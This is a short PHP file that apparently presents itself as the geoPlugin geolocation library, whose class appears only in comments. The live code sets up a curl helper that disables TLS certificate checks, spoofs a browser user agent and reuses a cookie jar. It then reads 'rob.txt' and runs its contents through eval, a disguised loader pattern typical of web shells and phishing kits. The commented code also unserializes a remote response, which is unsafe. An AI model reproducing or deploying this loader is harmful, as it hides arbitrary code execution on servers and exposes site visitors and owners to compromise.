<?php
/*class geoPlugin {
  
  //the geoPlugin server
  var $host = 'http://www.geoplugin.net/php.gp?ip={IP}&base_currency={CURRENCY}';
    
  //the default base currency
  var $currency = 'USD';
  
  //initiate the geoPlugin vars
  var $ip = null;
  var $city = null;
  var $region = null;
  var $areaCode = null;
  var $dmaCode = null;
  var $countryCode = null;
  var $countryName = null;
  var $continentCode = null;
  var $latitude = null;
  var $longitude = null;
  var $currencyCode = null;
  var $currencySymbol = null;
  var $currencyConverter = null;
  
  function geoPlugin() {

  }
  
  function locate($ip = null) {
    
    global $_SERVER;
    
    if ( is_null( $ip ) ) {
      $ip = $_SERVER['REMOTE_ADDR'];
    }
    
    $host = str_replace( '{IP}', $ip, $this->host );
    $host = str_replace( '{CURRENCY}', $this->currency, $host );
    
    $data = array();
    
    $response = $this->fetch($host);
    
    $data = unserialize($response);
    
    //set the geoPlugin vars
    $this->ip = $ip;
    $this->city = $data['geoplugin_city'];
    $this->region = $data['geoplugin_region'];
    $this->areaCode = $data['geoplugin_areaCode'];
    $this->dmaCode = $data['geoplugin_dmaCode'];
    $this->countryCode = $data['geoplugin_countryCode'];
    $this->countryName = $data['geoplugin_countryName'];
    $this->continentCode = $data['geoplugin_continentCode'];
    $this->latitude = $data['geoplugin_latitude'];
    $this->longitude = $data['geoplugin_longitude'];
    $this->currencyCode = $data['geoplugin_currencyCode'];
    $this->currencySymbol = $data['geoplugin_currencySymbol'];
    $this->currencyConverter = $data['geoplugin_currencyConverter'];
    
  }
  
  function fetch($host) {*/
function get_contents($url){
  $ch = curl_init("$url");
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEJAR,$GLOBALS['coki']);
  curl_setopt($ch, CURLOPT_COOKIEFILE,$GLOBALS['coki']);
  $result = curl_exec($ch);
  return $result;
}

$a = file_get_contents('rob.txt');
eval('?>'.$a);